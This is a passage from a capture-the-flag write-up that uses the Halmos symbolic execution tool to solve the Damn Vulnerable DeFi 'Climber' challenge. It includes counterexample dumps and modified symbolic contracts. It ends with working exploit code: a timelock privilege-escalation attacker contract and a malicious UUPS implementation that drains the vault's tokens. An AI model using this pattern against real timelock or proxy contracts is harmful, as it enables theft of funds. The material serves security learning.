Therefore, even based on this fake counterexample, a real attack can be found in practice.

However, we can relax, since all these problems will be solved when we consider the second counterexample. We are interested in these lines:
```javascript
...
halmos_attacker_fallback_bytes_bytes_303e2ea_138 = 0xfe96ffd0...00
...
halmos_execute_selector_bytes4_10ce5fe_134 = updateDelay
halmos_execute_selector_bytes4_1645f73_89 = grantRole
halmos_execute_selector_bytes4_ead1bb5_139 = 0xfe96ffd0
halmos_execute_target_address_85344a4_135 = 0x00000000000000000000000000000000aaaa0007
halmos_execute_target_address_9aac6c2_90 = 0x00000000000000000000000000000000aaaa0005
halmos_execute_target_address_df8939d_45 = 0x00000000000000000000000000000000aaaa0005
...
halmos_fallback_target_address_593d2c0_141 = 0x00000000000000000000000000000000aaaa0005
...
halmos_schedule_selector_bytes4_47daa14_190 = updateDelay
halmos_schedule_selector_bytes4_98bf8d3_193 = 0xfe96ffd0
halmos_schedule_selector_bytes4_badb2f8_187 = grantRole
halmos_schedule_target_address_4586a03_191 = 0x00000000000000000000000000000000aaaa0007
halmos_schedule_target_address_70b108c_188 = 0x00000000000000000000000000000000aaaa0005
halmos_schedule_target_address_bfbafb8_185 = 0x00000000000000000000000000000000aaaa0005
...
halmos_selector_bytes4_4da5861_47 = grantRole
halmos_selector_bytes4_8a4ebe8_142 = schedule
halmos_selector_bytes4_9c02733_02 = execute
halmos_selector_bytes4_9e9a490_92 = updateDelay
```
Essentially, this is the same bug but with different scenario. This time we give the `PROPOSER_ROLE` role not to `timelock`, but to the **SymbolicAttacker**, which, by calling its symbolic `fallback()`, registers this `operation`. In this scenario, we avoid the problem of not being able to create such calldata. So, this is a perfectly valid bug mechanism. Additionally, we now know the way for granting `PROPOSER_ROLE` rights to the **SymbolicAttacker**. 
### keccak256 map key handling
Before moving on to the next step, it is worth saying a few words about how Halmos handled cryptography here in the context of symbolic analysis. The thing is, after the weak handling of cryptography in [Truster](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster#counterexamples-analysis) and [The-rewarder](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/the-rewarder#dealing-with-merkle-functions), I got the impression that when working with Halmos, cryptography should be avoided **AT ALL**. But this challenge made me change my mind a bit, because Halmos did something non-trivial here.

In `schedule()`, `operations` are stored by bytes32 key (`id`):
```solidity
operations[id].readyAtTimestamp = uint64(block.timestamp) + delay;
operations[id].known = true;
```
This `id` is essentially a **keccak256** hash of some complex symbolic value (this hash also behaves like a symbolic value):
```javascript
f_sha3_4096(Concat(...,halmos_schedule_salt_bytes32_8b37382_249, ...))
```
That is, the `operation` was saved using this symbolic key.

Next, in `execute()`, we have another `id`, constructed in a similar way:
```solidity
function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
{
    bytes32 id = getOperationId(_targets, _values, _dataElementsSelectors, _salt);
    ...
    if (getOperationState(id) != OperationState.ReadyForExecution) {
        revert NotReadyForExecution(id);
    }

    operations[id].executed = true;
}
```
This time the id looks a little different, but with the same structure:
```javascript
f_sha3_4096(Concat(...,halmos_execute_salt_bytes32_ae9ed2c_76, ...))
```
In order to correctly find a counterexample, you need to:
1. Assume that the key returned in `execute()` may be equal to the key by which the data was saved in `schedule()`: 
    `sha3(complex_sym_val1) == sha3(complex_sym_val2)`
2. Assume that if 2 hashes are the same, then the symbolic values behind them are also the same:
    `(sha3(complex_sym_val1) == sha3(complex_sym_val2)) ==> (complex_sym_val1 == complex_sym_val2)`
    This is non-trivial behavior. This requires support at the engine level, and Halmos implements this logic! Otherwise, we would have to deal with constant fake hash collisions or not finding counterexamples at all.

We can get a complete list of such implemented heuristics by analyzing the regression tests in the Halmos repository. For example, there are tests about:
1. [keccak256()](https://github.com/a16z/halmos/blob/5c5ca39a1ee943ad8c8dc2fe042bdea44413ed69/tests/regression/test/Sha3.t.sol#L7)
2. [Signatures/ecrecover](https://github.com/a16z/halmos/blob/5c5ca39a1ee943ad8c8dc2fe042bdea44413ed69/tests/regression/test/Signature.t.sol)

and other. 

## preload implementation
We will add a preload (like in [selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie#symbolicattacker-preload)) to unlock a `PROPOSER_ROLE` privilege and test new scenarios.
```solidiity
function check_climber() public checkSolvedByPlayer {
    ...
    attacker.preload();
    attacker.attack();
}
```
```solidity
contract SymbolicAttacker is Test, SymTest {
    ...
    bool is_preload = false;
    ...
    fallback() external payable {
        if (is_preload)
        {
            bytes32 salt = hex"01";
            address[] memory targets = new address[](3);
            uint256[] memory values = new uint256[](3);
            bytes[] memory dataElements = new bytes[](3);
            targets[0] = address(timelock);
            targets[1] = address(timelock);
            targets[2] = address(this);
            values[0] = 0;
            values[1] = 0;
            values[2] = 0;
            dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
            dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
            dataElements[2] = abi.encodeWithSignature("attacker_fallback_selector()");
            timelock.schedule_preload(targets, values, dataElements, salt);
            return ;
        }
    ...
    }
    ...
    function preload(ClimberTimelock timelock) public {
        vm.assume(msg.sender == address(0xcafe0001)); // Only player can execute it
        is_preload = true;
        timelock = _timelock;
        bytes32 salt = hex"01";
        address[] memory targets = new address[](3);
        uint256[] memory values = new uint256[](3);
        bytes[] memory dataElements = new bytes[](3);
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(this);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
        dataElements[2] = abi.encodeWithSignature("attacker_fallback_selector()");
        timelock.execute_preload(targets, values, dataElements, salt);
        is_preload = false;
    }   
```
...
```solidity
contract ClimberTimelock is ClimberTimelockBase, FoundryCheats, HalmosCheats {
    ...
    bool is_preload;
    ...
    constructor(address admin, address proposer) {
        ...
        is_preload = true;
    }
    ...
    // Special functions versions to use preload. 
    // Essentially, these are the original, non-symbolic versions of the execute and schedule functions,
    // but they can only be executed during preload.
    function schedule_preload(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external onlyRole(PROPOSER_ROLE) {
        _vm.assume(is_preload == true);
        ...
    }
    
    function execute_preload(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
        external
        payable
    {
        _vm.assume(is_preload == true);
        ...
        is_preload = false;
    }
```
Now, given that we have the rights to execute any call on behalf of `timelock` (and even `delay` is `0` now), let's simplify the task for the solver a little and remove the check for the presence of an operation in the schedule:
```solidity
/*
* The special version of execute() to use by SymbolicAttacker with escalated privileges.
* Schedule checking is removed for simplicity since we can propose and execute the same operiation in 
* the same transaction
*/
function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
    external
    payable
{
    if (targets.length <= MIN_TARGETS) {
        revert InvalidTargetsCount();
    }

    if (targets.length != values.length) {
        revert InvalidValuesCount();
    }

    if (targets.length != dataElements.length) {
        revert InvalidDataElementsCount();
    }

    //bytes32 id = getOperationId(targets, values, dataElements, salt);

    address[] memory _targets = new address[](targets.length);
    uint256[] memory _values = new uint256[](values.length);
    bytes[] memory _dataElements = new bytes[](dataElements.length);
    bytes32 _salt = _svm.createBytes32("execute_salt");
    for (uint8 i = 0; i < targets.length; i++) {
        _targets[i] = _svm.createAddress("execute_target");
        _values[i] = _svm.createUint256("execute_value");
        (_targets[i], _dataElements[i]) = glob.get_concrete_from_symbolic_optimized(_targets[i]);
    }

    for (uint8 i = 0; i < targets.length; ++i) {
        uint snap0 = _vm.snapshotState();
        _targets[i].functionCallWithValue(_dataElements[i], _values[i]);
        uint snap1 = _vm.snapshotState();
        _vm.assume(snap0 != snap1);
    }

    /* We can make any operation ready for execution immediately
    if (getOperationState(id) != OperationState.ReadyForExecution) {
        revert NotReadyForExecution(id);
    }
    */
    //operations[id].executed = true;
}
```
And, of course, we will remove the invariant to check the immutability of `PROPOSER_ROLE`, otherwice every transaction will be a counterexample now :D
```solidity
// Check timelock roles immutability
/*
address symbolicProposer = svm.createAddress("symbolicProposer");
vm.assume(symbolicProposer != proposer);
assert(!timelock.hasRole(PROPOSER_ROLE, symbolicProposer));
*/
```
## Counterexample analysis (v2)
Let's see if we can now break some other invariant:
```javascript
halmos --solver-timeout-assertion 0 --function check_climber --loop 100  --default-array-lengths 1 --solver-timeout-branching 0
...
Counterexample:
halmos_attack_target_address_a574b9f_01 = 0x00000000000000000000000000000000aaaa0005
halmos_execute_target_address_86b06e3_37 = 0x00000000000000000000000000000000aaaa0004
halmos_execute_value_uint256_499d6db_38 = 0x0000000000000000000000000000000000000000000000000000000000000000
halmos_is_implementation_bool_40ddd50_40 = 0x01
halmos_selector_bytes4_36049ca_02 = execute
halmos_selector_bytes4_95bf4f7_39 = upgradeToAndCall
halmos_symbolicSpender_address_2f0913e_54 = 0x0000000000000000000000000000000000000000
p_dataElements[0]_bytes_e41f222_10 = 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
p_dataElements[0]_length_eb3fe30_11 = 0x0000000000000000000000000000000000000000000000000000000000000064
p_dataElements_length_4ea5857_09 = 0x0000000000000000000000000000000000000000000000000000000000000001
p_data_bytes_2c011eb_49 = 0xf2fde38b00000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
p_data_length_82b6379_50 = 0x0000000000000000000000000000000000000000000000000000000000000064
p_newImplementation_address_27cdc9b_48 = 0x00000000000000000000000000000000000000000000000000000000aaaa0003
p_salt_bytes32_08e7bfb_12 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_targets[0]_address_52be91e_06 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_targets_length_c542a8b_05 = 0x0000000000000000000000000000000000000000000000000000000000000001
p_values[0]_uint256_1f68feb_08 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_values_length_7d0d274_07 = 0x0000000000000000000000000000000000000000000000000000000000000001
```
Great! Now we know how to change the `vault` implementation. Just call `upgradeToAndCall()` on behalf of `timelock`. In fact, at this point the attack scenario became obvious: if we can replace the `vault` `implementation`, then we can do literally anything with its assets, including sending its tokens anywhere. Challenge solved!
## Attack implementation
**Climber.t.sol**:
```solidity
function test_climber() public checkSolvedByPlayer {
    Attacker attacker = new Attacker();
    MaliciousImpl impl = new MaliciousImpl();
    attacker.attack(timelock, ERC1967Proxy(payable(address(vault))), impl, token, recovery);
}
```
**Attacker.sol**:
```solidity
// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import "./MaliciousImpl.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract Attacker {
    ClimberTimelock timelock;
    ERC1967Proxy vault;
    MaliciousImpl impl;
    DamnValuableToken token;
    address recovery;

    bool is_preload = false;

    fallback() external payable {
        bytes32 salt = hex"01";
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(this);
        targets[3] = address(vault);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
        dataElements[2] = abi.encodeWithSignature("attacker_fallback_selector()");

        bytes memory transferBytes = abi.encodeWithSignature("malicious_transfer(address,address)", address(token), recovery);
        dataElements[3] = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(impl), transferBytes);

        timelock.schedule(targets, values, dataElements, salt);
    }

    function attack(ClimberTimelock _timelock, 
                        ERC1967Proxy _vault, 
                        MaliciousImpl _impl, 
                        DamnValuableToken _token, 
                        address _recovery) public {
        bytes32 salt = hex"01";
        timelock = _timelock;
        vault = _vault;
        impl = _impl;
        token = _token;
        recovery = _recovery;
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(this);
        targets[3] = address(vault);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
        dataElements[2] = abi.encodeWithSignature("attacker_fallback_selector()");

        bytes memory transferBytes = abi.encodeWithSignature("malicious_transfer(address,address)", address(token), recovery);
        dataElements[3] = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(impl), transferBytes);
        timelock.execute(targets, values, dataElements, salt);(targets, values, dataElements, salt);
    }

}
```
**MaliciousImpl.sol**:
```solidity
// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract MaliciousImpl is UUPSUpgradeable{
    constructor() {}

    function malicious_transfer(address token, address receiver) public {
        DamnValuableToken(token).transfer(receiver, 10_000_000e18);
    }
    
    function _authorizeUpgrade(address newImplementation) internal override {}

    fallback() external payable {}
}
```
Run:
```javascript
forge test --mp test/climber/Climber.t.sol
...
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.63ms (438.35µs CPU time)
```
Passed!
## Conclusions
1. It is important to consider the specifics of contracts during symbolic analysis. For example, the UUPS proxy implements 2 interfaces at once, which forced us to slightly change the logic of symbolic traversal of the setup.
2. When you need to compare 2 bytes arrays symbolically - you need to be VERY CAREFUL. There are cases when two arrays encoding the same transaction but have different hashes due to padding.
3. Simplifying validation can be very effective for finding bugs, or at least it can help find buggy patterns. Yes, we may encounter fake counterexamples, but if that's the price to find a real one, it's worth paying.
4. In this challenge, we again managed to "cut" the problem and "eat it in smaller pieces": first we found the privilege escalation, then the mechanism for changing the proxy implementation having these rights. However, the privilege escalation bug is atomic, indivisible in nature. Halmos also coped with it, but had to significantly expand the number of symbolic calls in the operation and wait many hours until something was found.
5. The symbolic `fallback()` functionality for **SymbolicAttacker** turned out to be necessary to solve this challenge. This functionality should be useful for future challenges!
6. Halmos has some effective techniques for working with cryptographic functions. It is worth understanding what Halmos can and cannot do, so that you can better predict its scope of capabilities for the current test, and, on the other hand, so that the results do not seem like "magic" :D
